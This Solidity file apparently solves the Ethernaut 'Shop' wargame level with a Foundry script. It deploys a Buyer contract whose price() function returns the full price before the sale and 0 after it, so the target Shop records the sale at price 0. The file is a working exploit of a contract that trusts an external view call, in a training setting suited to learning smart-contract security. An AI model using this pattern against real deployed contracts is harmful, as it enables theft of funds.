// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { Buyer, Shop } from "./Problem.sol";

contract Solution is Buyer{
    Shop shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function price() external view override returns (uint) {
        if(shop.isSold()) {
            return 0;
        } else {
            return shop.price();
        }
    }

    function buy() external {
        shop.buy();
    }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        Shop shop = Shop(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution(shop);
        solution.buy();
        vm.stopBroadcast();

        assert(shop.isSold());
        assert(shop.price() == 0);
    }

    function getLevelAddress() internal view override returns(address) {
        return 0x3aCd4766f1769940cA010a907b3C8dEbCe0bd4aB;
    }
}

